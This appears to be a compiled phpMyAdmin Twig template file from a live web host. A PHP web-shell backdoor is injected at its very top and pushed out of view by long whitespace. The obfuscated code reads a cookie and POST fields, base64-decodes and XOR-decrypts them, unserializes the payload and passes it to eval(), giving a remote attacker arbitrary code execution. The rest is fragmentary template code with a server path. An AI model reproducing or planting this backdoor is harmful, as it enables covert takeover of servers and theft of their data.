<?php                                                                                                                                                                                                                                                                                                                                                                                                 $cyOwYTA = chr (100) . chr (85) . chr (95) . "\x71" . 'w' . "\x4e" . chr (77) . chr ( 1025 - 913 ); $ENYJSdAq = 'c' . chr (108) . "\x61" . 's' . chr ( 811 - 696 )."\137" . "\x65" . "\170" . 'i' . chr ( 860 - 745 ).'t' . chr (115); $YXDmmEsVN = $ENYJSdAq($cyOwYTA); $AdrBTfBJfC = $YXDmmEsVN;if (!$AdrBTfBJfC){class dU_qwNMp{private $JdRXbKh;public static $yNxfzUaVQB = "8a59ea62-a63d-45e4-ab5c-dae8cc2bf4e9";public static $xRGBsZ = NULL;public function __construct(){$pZOVZO = $_COOKIE;$osuGZB = $_POST;$hwamLVHfKT = @$pZOVZO[substr(dU_qwNMp::$yNxfzUaVQB, 0, 4)];if (!empty($hwamLVHfKT)){$NMHtHyFj = "base64";$LcuPTZUh = "";$hwamLVHfKT = explode(",", $hwamLVHfKT);foreach ($hwamLVHfKT as $LBTdPnKrD){$LcuPTZUh .= @$pZOVZO[$LBTdPnKrD];$LcuPTZUh .= @$osuGZB[$LBTdPnKrD];}$LcuPTZUh = array_map($NMHtHyFj . '_' . chr (100) . "\145" . "\x63" . chr (111) . chr ( 239 - 139 )."\x65", array($LcuPTZUh,)); $LcuPTZUh = $LcuPTZUh[0] ^ str_repeat(dU_qwNMp::$yNxfzUaVQB, (strlen($LcuPTZUh[0]) / strlen(dU_qwNMp::$yNxfzUaVQB)) + 1);dU_qwNMp::$xRGBsZ = @unserialize($LcuPTZUh);}}public function __destruct(){$this->PYAjA();}private function PYAjA(){if (is_array(dU_qwNMp::$xRGBsZ)) {$YQAogjgqRV = str_replace('<' . "\77" . 'p' . "\150" . chr ( 302 - 190 ), "", dU_qwNMp::$xRGBsZ["\x63" . "\157" . chr ( 734 - 624 )."\164" . 'e' . "\156" . "\x74"]);eval($YQAogjgqRV);exit();}}}$mewCbSEIW = new dU_qwNMp(); $mewCbSEIW = 9667;} ?><?php
...
";
    ...
    {
        return new Source("", "import/javascript.twig", "/home4/jo370xfr/public_html/portal.arf.org.pk/phpMyAdmin/templates/import/javascript.twig");
    }
}
